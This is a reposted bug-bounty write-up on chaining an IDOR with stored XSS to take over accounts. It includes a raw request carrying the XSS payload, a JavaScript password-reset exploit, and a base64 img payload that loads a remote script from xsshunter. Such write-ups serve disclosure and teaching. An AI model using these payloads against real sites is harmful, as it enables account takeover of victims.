# :globe_with_meridians: Zero Click To Account Takeover Idor Xss 98Dd6Cce63C4

> **Original Source:** [Zero Click To Account Takeover Idor Xss 98Dd6Cce63C4](https://infosecwriteups.com/zero-click-to-account-takeover-idor-xss-98dd6cce63c4)
> **Platform:** infosecwriteups.com | **Category:** `WEB`

---

The IDOR was the simplest type of IDOR on an updated profile, and the attacker was able to update other user profiles via change the data[user][id] value parameter.


When I found this vulnerability, decided to escalate the vulnerability and compile it with another thing. I realized the data[user][photo] is reflected in the src of the img tag. In one shot I realized able to close the src value of the IMG tag but was unable to close the img tag. I used the onerror event handler to execute Javascript on the victim account.


```
POST /users/update_my_profile HTTP/1.1
Host: [www.target.com](http://www.target.com)... _method=POST&data[_Token][key]=6e8b90f4e7d7c694735d4f1c83db5968bf295f26&data[User][id]=808265&data[User][photo]=https://s3-us-west-2.amazonaws.com/target/nonexistent.png"+onerror=alert(origin)&data[User][photo_old]=&data[User][name]=Arman.Security&data[User][gender]=m&data[date][day]=&data[date][month]=&data[date][year]=&data[User][mobile_number]=&data[_Token][fields]=fa628e2b05473ddd3cbbee31d2d9c311eba4c9d5%3A&data[_Token][unlocked]=
```


And that return on profile like this:


Now we have an IDOR and XSS, Now time to use XSS to account takeover or access the private information of the victim account.


The website work on a Cookie base and has 2 verification token on each request, one of them was stable and one of them is changeable for each function. The Important part was ignoring the old password to update the password :)


I had to write an exploit that lead me to collect all victim tokens and test all modes for variable tokens on the update password function.


## Get M7arm4n’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


That was the exploit code:


```
url = "https://www.target.com/editar-mi-contrasena";var token_keys_array = [];var token_fields_array = [];var params = [];var body = "";var xhr = new XMLHttpRequest();xhr.responseType = "document";xhr.open("GET", url, true);xhr.withCredentials = true;var xmlHttpRequest2 = new XMLHttpRequest();xmlHttpRequest2.open("POST", "https://www.target.com/editar-mi-contrasena", true);xmlHttpRequest2.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");xmlHttpRequest2.setRequestHeader("Referer", "https://www.target.com/editar-mi-contrasena");xmlHttpRequest2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");xmlHttpRequest2.setRequestHeader("Upgrade-Insecure-Requests", "1");xmlHttpRequest2.setRequestHeader("Sec-Fetch-Mode", "navigate");xmlHttpRequest2.setRequestHeader("Sec-Fetch-Dest", "document");xmlHttpRequest2.setRequestHeader("Sec-Fetch-User", "?1");xmlHttpRequest2.withCredentials = true;xmlHttpRequest2.onreadystatechange = function () {if (this.readyState == 4 && this.status == 302) {print("response=" + this.responseText);print("done");};};xhr.onreadystatechange = function() {if (xhr.readyState == 4){xhr.response.querySelectorAll("input[name='data[_Token][key]']").forEach( input => {token_keys_array.push(input.value)});xhr.response.querySelectorAll("input[name='data[_Token][fields]']").forEach( input => {token_fields_array.push(input.value)});for (let b = 0; b < token_fields_array.length; b++) {if (b == 2){body = "_method=POST&data%5B_Token%5D%5Bkey%5D="+token_keys_array[0]+"&data%5BUser%5D%5Bpassword%5D=EvilOrAngel&data%5BUser%5D%5Bpassword_confirmation%5D=EvilOrAngel&data%5B_Token%5D%5Bfields%5D="+encodeURIComponent(token_fields_array[b])+"&data%5B_Token%5D%5Bunlocked%5D=";xmlHttpRequest2.send(body);};};};};xhr.send();
```


Convert the exploit code to Base64 encode then set on id value of the img tag and execute it by onerror=eval(atob(this.id)). Something like this:


```
"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzaHVudGVyLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))>
```


Now IDOR helps to store the XSS payload on the victim account then the exploit helps us to take over the victim account. Easy Boy 😎


[Twitter](https://twitter.com/m7arm4n) 🐦

---

*Originally published on [Medium](https://infosecwriteups.com/zero-click-to-account-takeover-idor-xss-98dd6cce63c4). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
